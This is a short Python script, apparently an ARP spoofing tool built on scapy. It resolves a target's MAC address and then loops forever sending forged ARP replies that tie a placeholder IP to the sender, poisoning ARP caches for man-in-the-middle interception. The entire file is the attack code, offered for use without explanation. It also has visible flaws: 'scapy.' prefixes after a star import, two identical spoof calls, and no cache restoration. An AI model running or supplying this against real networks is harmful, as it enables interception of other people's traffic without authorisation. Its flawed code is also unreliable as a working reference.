#!/usr/bin/python

from scapy.all import *

def getTargetMac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    finalPacket = broadcast/arp_request
    answer = scapy.srp(finalPacket, timeout=2, verbose=False)[0]
    mac = answer[0][1].hwsrc
    return(mac)


def spoof_arp(target_ip, spoofed_ip):
    mac = getTargetMac(target_ip)
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
    scapy.send(packet, verbose=False)

def main():
    try:
        while True:
            spoof_arp("TARGET_IP", "SPOOFED_IP")
            spoof_arp("TARGET_IP", "SPOOFED_IP")
    except KeyboardInterrupt:
        print("[!] Program Interrupted")
        exit(0)

main()
